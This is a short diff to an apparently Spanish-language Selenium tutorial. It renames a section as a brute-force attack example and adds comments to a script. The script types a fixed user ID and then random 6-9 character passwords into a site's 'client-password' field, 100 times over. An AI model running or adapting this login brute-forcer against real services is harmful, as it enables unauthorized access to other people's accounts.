@@ -10,12 +10,17 @@ Usa el pip en la consola para instalar el paquete de selenium.
 ```bash
 pip install selenium
 ```
-## Uso de python con selenium
+## Ejemplo de uso de python con selenium (ataque fuerza bruta)
 
 ```python
 import string
 import time
 import random
+
+'''Carga el módulo webdriver para implementar
+las clases y métodos para el soporte de los
+diferentes navegadores'''
+
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.action_chains import ActionChains
@@ -29,6 +34,8 @@ for x in range(100):
     usr.send_keys("20189579-0")
     psw = driver.find_element_by_id("client-password")
     str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
+    
+    #Se introduce el valor que contiene la variable password
     psw.send_keys(str)
     print(str)
     
